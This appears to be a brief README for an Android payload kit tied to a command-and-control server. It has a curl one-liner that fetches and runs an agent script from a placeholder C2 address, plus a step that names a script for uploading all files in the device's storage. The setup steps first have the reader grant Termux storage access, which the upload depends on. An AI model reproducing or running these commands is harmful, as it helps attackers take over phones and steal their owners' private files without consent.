# Android Payloads
Need to download the TERMUX application on the Android device
Then, after opening the Termux terminal 

Use the termux-setup-storage command --> It will pop up the settings UI where you can toggle on and give access to Termux for internal storage access.
In the termux terminal, use ls and check if it shows ~/Storage directory.

To connect to the c2 server download and run android_termux_agent.sh ( curl -s http://<IP-ADDRESS>:8084/payloads/android_termux_agent.sh -o agent.sh && chmod +x agent.sh && ./agent.sh )
And if you wanna upload all files from ~/storage, then use ./android_auto_upload.sh
